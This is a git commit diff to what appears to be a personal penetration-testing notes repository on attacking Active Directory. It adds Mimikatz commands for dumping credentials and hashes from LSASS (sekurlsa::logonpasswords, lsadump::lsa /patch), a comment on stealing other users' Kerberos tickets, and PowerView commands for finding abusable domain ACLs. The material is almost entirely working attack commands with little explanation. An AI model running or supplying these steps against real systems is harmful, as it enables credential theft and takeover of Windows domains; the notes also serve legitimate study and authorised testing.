3a1cde3e1ca009d4c38e0b243378c69a47440ae2
qv1ntv5 <sanmillan.german@gmail.com>
2023-08-28 16:12:47 -0400

    COmmit

--- ActiveDirectory/AttackAD/StealCachedCreds.ps1
+++ ActiveDirectory/AttackAD/StealCachedCreds.ps1
@@ -8,6 +8,10 @@ privilege::debug
 
 sekurlsa::logonpasswords
 
+# Or 
+
+lsadump::lsa /patch
+
 #At this point we could try to crack those hashes but also we could exploit Kerberos authentication by abusing TGT and service tickets we know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS, and we can use Mimikatz to interact with and retrieve our own tickets as well as the tickets of other local users.
 
 sekurlsa::tickets
--- ActiveDirectory/EnumAD/ObjectPermissions.ps1
+++ ActiveDirectory/EnumAD/ObjectPermissions.ps1
@@ -16,3 +16,7 @@
 Get-ObjectAcl -Identity <object> | Select ObjectSID,ActiveDirectoryRights,SecurityIdentifier #<--- Retrieve SIDs and ADProperty about the specified object. Then we need to convert the SIDs to discover the object afected and the object owner of the permissions with "Convert-SidToName".
 
 #For example, because we are only interested; Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights.
+
+# Also it could be interesting the following command with POWERVIEW module:
+
+Find-InterestingDomainAcl | Select-Object IdentityReferenceName
